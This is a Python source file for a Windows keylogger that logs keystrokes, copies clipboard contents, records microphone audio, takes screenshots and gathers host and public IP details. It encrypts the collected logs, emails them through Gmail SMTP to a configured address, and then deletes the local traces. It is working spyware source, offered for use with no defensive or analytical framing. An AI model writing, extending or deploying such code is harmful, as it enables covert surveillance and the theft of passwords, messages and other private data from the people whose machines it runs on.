#Libraries
from email import encoders
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import smtplib

import socket
import platform

import win32clipboard #for copied content(clipboard)

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write #for audio
import sounddevice as sd

from cryptography.fernet import Fernet #for encryption of file data

import getpass
from requests import get

from multiprocessing import Process, freeze_support #for ss
from PIL import ImageGrab

#Code
        #file names
keys_info= "key_log.txt"
system_information="systeminfo.txt"
clipboard_information="clipboard.txt"
audio_information="audio.wav"
screenshot_information="screenshot.png"
        #encrypted file names
keys_information_e="e_key_log.txt"
system_information_e="e_systeminfo.txt"
clipboard_information_e="e_clipboard.txt"

microphone_time=5
time_iteration=5000
number_of_iterations_end=1

file_path="C:\\Users\\...." #Pprovide valid path where all files are stored
extend = "\\"
file_merge=file_path+extend

email_add="xyz@gmail.com" #enter your email
password="password" 
# username=getpass.getuser() #for other user
to_address="xyz@gmail.com" #enter your email

key="WYhZKRFztAOc1isQRacHbY_wmntwbxAQJRYJI2T4uMk=" #key for encrypted data | (to change it: run the GenerateKey file in cryptography folder and then copy-paste the generated keys from the text file defined there to this place)

        #Email controls 
def send_email(filename,attachment,to_address,content):
    fromaddr=email_add
    msg=MIMEMultipart()
    msg['From']=fromaddr
    msg['To']=to_address
    msg['Subject']="Logged File: "+content
    body="--"+content+" is below:--"
    msg.attach(MIMEText(body,'plain'))
    filename=filename
    attachment=open(attachment,'rb')
    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"attachment; filename= %s " %filename)
    msg.attach(p)
    s=smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)
    text=msg.as_string()
    s.sendmail(fromaddr,to_address,text)
    s.quit()
send_email(keys_info,file_path+extend+keys_info,to_address,"Key Information")
send_email(system_information,file_path+extend+system_information,to_address,"System Information")

        #Get computer information
def computer_information():
    with open(file_path+extend+system_information,"a") as f:
        hostname=socket.gethostname()
        IPAddr=socket.gethostbyname(hostname)
        try:
            public_ip=get("https://api.ipify.org").text #using get funcn to get certain info and then converting that to text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")
            
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System : " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("HostName: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')
computer_information()
        #Get the clipboard contents
def copy_clipboard():
    with open(file_path+extend+clipboard_information,"a") as f:
        try: #only copied strings would be stored
            win32clipboard.OpenClipboard() #to open clipboard
            pasted_data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied (copied content:not a string)")
copy_clipboard()
        #Get the microphone contents
def microphone():
    fs= 44100 #default value of sampling frequency
    seconds = microphone_time #number of seconds it will record

    myrecording=sd.rec(int(seconds * fs), samplerate=fs,channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)
microphone()

        #Get screenshots
def screenshot():
    im=ImageGrab.grab()
    im.save(file_path+extend+screenshot_information)
screenshot()

        #Timer for Keylogger
number_of_iterations=0
currentTime= time.time()
stoppingTime= time.time() + time_iteration

while number_of_iterations< number_of_iterations_end:

    count=0
    keys=[]

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count+=1
        currentTime=time.time()

        if count>=1:
            count=0
            write_file(keys)
            keys=[]

    def write_file(keys):
        with open(file_path+extend+keys_info,"a") as f:
            for key in keys:
                k=str(key).replace("'","")
                if k.find("enter")>0:
                    screenshot() #takes a ss every time <enter> is pressed
                    f.write('\n')
                    f.close()
                elif k.find("Key")==-1:
                    f.write(k)
                    f.close()
                elif k.find("space")>0:
                    screenshot() #takes a ss every time <enter> is pressed
                    f.write(" ")
                    f.close()

    def on_release(key):
        if key== Key.esc:
            screenshot() #takes a ss before exiting the program
            send_email(keys_info,file_path+extend+keys_info,to_address,"Key Information")
            send_email(system_information,file_path+extend+system_information,to_address,"System Information")
            return False
        if currentTime>stoppingTime:
            return False
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
    
    if currentTime>stoppingTime:
        with open(file_path + extend + keys_info,"w")  as f:
            f.write(" ")
            
        screenshot()
        send_email(screenshot_information,file_path+extend+screenshot_information,to_address,"Screenshot Information")

        copy_clipboard()
        number_of_iterations+=1
        currentTime=time.time()
        stoppingTime=time.time()+time_iteration


                            #ENCRYPTION: 
files_to_encrypt=[file_merge + system_information, file_merge + clipboard_information, file_merge + keys_info]
encrypted_file_name=[file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count=0
for i in files_to_encrypt:
    with open(files_to_encrypt[count],'rb') as f:
        data=f.read()
    fernet=Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_name[count],'wb') as f:
        f.write(encrypted)
    send_email(encrypted_file_name[count], encrypted_file_name[count], to_address, encrypted_file_name[count].rstrip("_e"))
    count+=1
time.sleep(30) #sleep for 30seconds to avoid interruption while sending emails

delete_files = [system_information,clipboard_information, keys_info,screenshot_information, audio_information]
for i in delete_files:
    os.remove(file_merge + i)